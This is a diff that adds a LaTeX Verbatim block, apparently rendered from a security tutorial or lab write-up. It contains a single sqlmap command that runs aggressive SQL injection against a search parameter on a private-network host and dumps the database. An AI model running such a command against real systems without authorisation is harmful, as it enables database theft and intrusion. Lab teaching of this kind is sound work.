@@ -1,0 +1,3 @@
+\begin{Verbatim}[commandchars=\\\{\}]
+\PYG{+w}{        }sqlmap\PYG{+w}{ }\PYGZhy{}u\PYG{+w}{ }\PYG{l+s+s2}{\PYGZdq{}http://192.168.1.50/index.php?search=cable\PYGZdq{}}\PYG{+w}{ }\PYGZhy{}\PYGZhy{}random\PYGZhy{}agent\PYG{+w}{ }\PYGZhy{}\PYGZhy{}level\PYG{o}{=}\PYG{l+m}{5}\PYG{+w}{ }\PYGZhy{}\PYGZhy{}risk\PYG{o}{=}\PYG{l+m}{3}\PYG{+w}{ }\PYGZhy{}\PYGZhy{}dump\PYG{+w}{  }\PYGZhy{}\PYGZhy{}flush\PYGZhy{}session
+\end{Verbatim}
